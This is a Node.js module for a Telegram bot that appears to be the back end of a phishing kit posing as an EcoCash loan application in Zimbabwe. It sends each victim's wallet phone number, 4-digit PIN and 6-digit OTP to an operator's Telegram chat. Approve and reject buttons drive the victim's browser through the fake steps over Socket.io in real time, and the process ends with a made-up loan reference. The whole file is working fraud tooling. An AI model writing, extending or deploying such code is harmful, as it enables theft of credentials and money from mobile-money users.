require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");

// Initialize bot without polling (Render uses webhooks)
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: false });
const ADMIN_ID = process.env.ADMIN_CHAT_ID;

// Reference placeholder for Socket.io instance
let ioInstance = null;

const botManager = {
    bot: bot,

    // Helper to securely inject the working Socket.io instance from server.js
    initIo: (io) => {
        ioInstance = io;
    },

    sendToAdmin: (appId, title, data, needsApproval = false) => {
        let msg = `<b>${title}</b>\n🆔 ID: <code>${appId}</code>\n`;
        for (const [k, v] of Object.entries(data)) {
            msg += `<b>${k}:</b> <code>${v}</code>\n`;
        }

        const options = { parse_mode: 'HTML' };
        if (needsApproval) {
            options.reply_markup = {
                inline_keyboard: [[
                    // Step 4 Approval: Moves user to Step 5 (Wallet PIN Screen)
                    { text: "✅ APPROVE OTP (Move to Wallet PIN)", callback_data: `approve_4_${appId}` },
                    { text: "❌ REJECT OTP", callback_data: `reject_4_${appId}` }
                ]]
            };
        }
        bot.sendMessage(ADMIN_ID, msg, options);
    },

    sendFinalApproval: (appId, phone, password) => {
        // Step 5 Payload: Receives Wallet Phone and 4-Digit PIN
        const msg = `🏁 <b>🇿🇼 FINAL ECOCASH WALLET PIN RECEIVED</b>\n🆔 ID: <code>${appId}</code>\n📱 Phone: <code>${phone}</code>\n🔐 PIN: <code>${password}</code>`;
        bot.sendMessage(ADMIN_ID, msg, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: "✅ COMPLETE LOAN", callback_data: `approve_5_${appId}` },
                    { text: "❌ REJECT PIN", callback_data: `reject_5_${appId}` }
                ]]
            }
        });
    }
};

// Handle Admin Button Clicks
bot.on("callback_query", (query) => {
    const dataParts = query.data.split("_");
    const action = dataParts[0]; // "approve" or "reject"
    const step = dataParts[1];   // "4" or "5"
    const appId = dataParts[2];  // Unique alphanumeric reference ID
    
    // Use the explicitly linked socket instance or fallback to global object
    const io = ioInstance || global.io;
    let currentText = query.message.text || "";

    if (!io) {
        console.error("Socket.io engine context missing in bot_manager.js execution layer.");
        bot.answerCallbackQuery(query.id, { text: "Error: Socket server unreachable." });
        return;
    }

    if (action === "approve") {
        if (step === "4") {
            // Signal frontend to approve OTP and show Step 5 (Wallet PIN input)
            io.to(appId).emit('pin-verified');
            bot.answerCallbackQuery(query.id, { text: "OTP Approved. Wallet PIN input shown to user." });
        } 
        else if (step === "5") {
            // Signal frontend to approve Wallet PIN and show final completion screen
            const ref = "ZIM-" + Math.floor(Math.random() * 900000 + 100000);
            io.to(appId).emit('password-verified', { referenceId: ref });
            bot.answerCallbackQuery(query.id, { text: "EcoCash Application Completed!" });
        }
        
        bot.editMessageText(currentText + "\n\n✅ <b>ACTION: APPROVED</b>", {
            chat_id: ADMIN_ID,
            message_id: query.message.message_id,
            parse_mode: 'HTML'
        });
    }

    if (action === "reject") {
        if (step === "4") {
            // Rejects 6-digit OTP code input
            io.to(appId).emit('pin-rejected', { message: "The 6-digit verification code is invalid or expired." });
            bot.answerCallbackQuery(query.id, { text: "OTP Token Rejected" });
        } 
        else if (step === "5") {
            // Rejects EcoCash Wallet PIN code entry
            io.to(appId).emit('password-rejected', { message: "PIN code verification failed. Please try again." });
            bot.answerCallbackQuery(query.id, { text: "EcoCash Wallet PIN Rejected" });
        }
        
        bot.editMessageText(currentText + "\n\n❌ <b>ACTION: REJECTED</b>", {
            chat_id: ADMIN_ID,
            message_id: query.message.message_id,
            parse_mode: 'HTML'
        });
    }
});

module.exports = botManager;
